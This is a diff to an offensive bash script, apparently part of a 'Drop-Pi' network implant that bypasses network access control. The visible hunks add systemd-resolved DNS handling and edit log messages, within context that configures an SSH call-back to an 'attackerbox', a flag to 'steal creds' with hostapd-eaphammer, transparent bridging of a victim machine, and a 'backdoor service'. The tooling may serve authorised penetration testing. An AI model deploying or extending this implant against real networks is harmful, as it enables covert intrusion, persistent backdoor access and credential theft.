@@ -22,6 +22,7 @@ DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
 RANGE=61000-62000 #Ports for my traffic on NAT
 RUNAPD=0 #1 - yes steal creds, 0 - no, just don't
 RUNWF=0 #1 - yes to set up wireless, 0 - no, just don't
+USINGRESOLVD=1 #1 - system is using systemd-resolvd, 0 - no just update /etc/resolv.conf
 HOSTAPDPATH="/opt/Drop-Pi/eaphammer/hostapd-eaphammer/hostapd/hostapd-eaphammer"
 HOSTWIREDCONF="/opt//Drop-Pi/NacBypass2.0/hostapd-wired.conf"
 RANDSTRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
@@ -89,8 +90,8 @@ EAPOLMagic() {
       fi
       return 0
     else
-      echo "Failed to get initial victim traffic, is the machine on? Are you on? Who am I?"
-      echo "Failed to get initial victim traffic, is the machine on? Are you on? Who am I?/n" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      echo "Failed to get initial victim traffic, is the machine on? Are you one? Who am I?"
+      echo "Failed to get initial victim traffic, is the machine on? Are you one? Who am I?/n" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       ErrNotifi
     fi
 }
@@ -163,9 +164,17 @@ DHCPSecretSquirrel() {
            fi
            DNSSERV=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "(6)" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
 	   while read -r line; do
-               echo "nameserver $line" >> /etc/resolv.conf
+               if [ $USINGRESOLVD -eq 1 ]; then
+                    echo "[Resolve]" > /etc/systemd/resolved.conf
+                    echo "DNS=$line" >> /etc/systemd/resolved.conf
+                    echo "FallbackDNS=8.8.8.8" >> /etc/systemd/resolved.conf
+                    #systemctl reload systemd-resolved
+               else
+                    echo "nameserver $line" > /etc/resolv.conf
+                    echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+               fi
            done <<< "$DNSSERV"
-           echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+           #echo "nameserver 8.8.8.8" >> /etc/resolv.conf
            echo "Gateway IP: $GWIP"
            echo "Gateway IP: $GWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Bridge Interface: $BRINT"
@@ -264,12 +273,14 @@ GoGoNacBypass() {
       	#     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p icmp -j SNAT --to $COMIP
       	#     echo 1 > /proc/sys/net/ipv4/ip_forward
       	#fi
-      	#echo "Creating route for WIFI dualhomed access to internet."
-      	#echo "Creating route for WIFI dualhomed access to internet." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      	echo "Creating route for WIFI dualhomed access to internet."
+      	echo "Creating route for WIFI dualhomed access to internet." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       fi
-      echo "Creating route for all internal network traffic."
-      echo "Creating route for all internal network traffic." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
-
+      echo "Creating route for all internal network traffice."
+      echo "Creating route for all internal network traffice." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      if [ $USINGRESOLVD -eq 1 ]; then
+          systemctl restart systemd-resolved
+      fi
 
       echo "Time for fun & profit"
       echo "Time for fun & profit" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
@@ -277,7 +288,7 @@ GoGoNacBypass() {
       echo "Starting backdoor service" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
 
       if [ $RUNWF -eq 1 ]; then
-	      echo "Bringing up WLAN0"
+	echo "Bringing up WLAN0"
       	echo "Bringing up WLAN0" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       	systemctl enable NetworkManager
       	sleep 10
@@ -364,6 +375,10 @@ case "$1" in
        brctl delif $BRINT $COMPINT
        brctl delif $BRINT $SWINT
        brctl delbr $BRINT
+    fi
+    if [ $USINGRESOLVD -eq 1 ]; then
+        echo "[Resolve]" > /etc/systemd/resolved.conf
+        systemctl restart systemd-resolved
     fi
     if [ $RUNWF -eq 1 ]; then
     	echo "Bringing down WLAN0"
